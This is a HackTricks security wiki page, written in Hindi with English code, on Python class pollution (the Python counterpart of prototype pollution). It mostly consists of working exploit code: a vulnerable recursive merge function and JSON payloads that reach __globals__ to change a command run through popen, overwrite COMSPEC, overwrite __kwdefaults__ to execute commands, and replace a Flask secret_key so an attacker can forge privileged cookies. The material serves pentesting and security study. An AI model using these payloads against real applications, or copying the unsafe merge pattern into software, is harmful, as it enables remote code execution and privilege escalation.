# Class Pollution (Python's Prototype Pollution)

{{#include ../../banners/hacktricks-training.md}}

## मूल उदाहरण

जांचें कि strings के साथ objects की classes को pollute करना कैसे संभव है:<sup>[[1]](#references)</sup>
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## मूलभूत Vulnerability उदाहरण
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## गैजेट उदाहरण

<details>

<summary>RCE (subprocess) के लिए class property का default value बनाना</summary><sup>[[1]](#references)</sup>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary><code>globals</code> के माध्यम से अन्य classes और global vars को pollute करना</summary><sup>[[1]](#references)</sup>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>मनमाना subprocess execution</summary><sup>[[1]](#references)</sup>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary><strong><code>__kwdefaults__</code></strong> को ओवरराइट करना</summary>

**`__kwdefaults__`** सभी functions का एक विशेष attribute है। Python [documentation](https://docs.python.org/3/library/inspect.html) के अनुसार, यह “**keyword-only** parameters के लिए किसी भी default values की mapping” है। इस attribute को pollute करने से हम किसी function के keyword-only parameters की default values को नियंत्रित कर सकते हैं। ये function के वे parameters होते हैं जो \* या \*args के बाद आते हैं।<sup>[[1]](#references)</sup>
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Files के across Flask secret को Overwriting करना</summary>

तो, यदि आप web की main python file में defined किसी object पर class pollution कर सकते हैं, लेकिन **जिसकी class main file से अलग किसी file में defined है**। क्योंकि पिछले payloads में \_\_globals\_\_ तक पहुंचने के लिए आपको object की class या class के methods तक पहुंचना आवश्यक है, इसलिए आप **उस file में मौजूद globals तक पहुंच सकेंगे, लेकिन main file में मौजूद globals तक नहीं**। \
इसलिए, आप main page में **secret key** को define करने वाले **Flask app global object** तक **नहीं पहुंच सकेंगे**:<sup>[[1]](#references)</sup>
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
इस scenario में आपको files को traverse करने के लिए एक gadget की आवश्यकता है, ताकि **global object `app.secret_key` तक access** करके Flask secret key को बदल सकें और इस key को जानकर [**escalate privileges**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) कर सकें।

इस [writeup](https://ctftime.org/writeup/36082) से लिया गया इस तरह का एक payload:<sup>[[2]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
इस payload का उपयोग करके **`app.secret_key`** (आपके app में नाम अलग हो सकता है) को **change** करें, ताकि आप नए और अधिक privileges वाले flask cookies को sign कर सकें।

</details>

अधिक read only gadgets के लिए निम्नलिखित page भी देखें:


{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## संदर्भ

- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [2] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)

{{#include ../../banners/hacktricks-training.md}}
